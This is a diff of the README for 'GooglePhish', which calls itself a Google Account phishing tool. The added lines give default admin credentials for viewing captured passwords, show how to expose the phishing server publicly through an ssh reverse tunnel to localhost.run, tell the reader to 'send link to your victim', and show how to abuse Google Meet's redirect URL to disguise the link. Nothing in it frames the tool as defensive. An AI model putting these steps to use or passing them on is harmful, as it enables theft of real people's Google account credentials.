@@ -1,4 +1,4 @@
-## GooglePhish
+# GooglePhish
 - Google Account Phishing Tool
 
 ## Generate and update new random key before using GooglePhish
@@ -11,8 +11,20 @@
     # SECURITY WARNING: keep the secret key used in production secret!
     SECRET_KEY = 'your_new_key'
   ```
+  
+## Admin Page
+- login page 
+    ```url
+    http://127.0.0.1:8000/admin
+    ``` 
+    > `Note` : It is recommended to change default admin page url.  
+    > 
+    > ***Default Login Details***  
+    > `username` :  admin  
+    > `password` : googlephish  
 
-## create user to view passwords
+
+## Create new admin user to view passwords
 
 - Create user
     ```bash
@@ -28,12 +40,6 @@
     python3 manage.py runserver
     ```
 
-### Default admin details 
-```
-username :  admin
-password : googlephish
-```
-
 ## Start Server
 ```bash
 python3 manage.py runserver
@@ -42,6 +48,29 @@ python3 manage.py runserver
 > ```bash
 > python3 manage.py runserver --insecure
 > ```
+
+## For phishing over the internet
+
+- Start server
+    ```bash
+    python3 manage.py --insecure
+    ```
+
+- forward port using ssh
+    ```bash
+    ssh -R 80:localhost:8000 localhost.run
+    ```
+    > 8000 is port of localhost server.
+    > 80 is [localhost.run](https://localhost.run/) server port. Localhost is service that helps you to expose your server running on localhost to the internet, visit their [documentation](https://localhost.run/docs/) for more info
+
+
+- Now send link to your victim
+
+> You can redirect user from google meet to your phishing page link using 
+> ```
+> https://meet.google.com/linkredirect?dest=your_link
+> ```
+
 
 ### Have any Ideas 💡 or issue
 - Create an issue
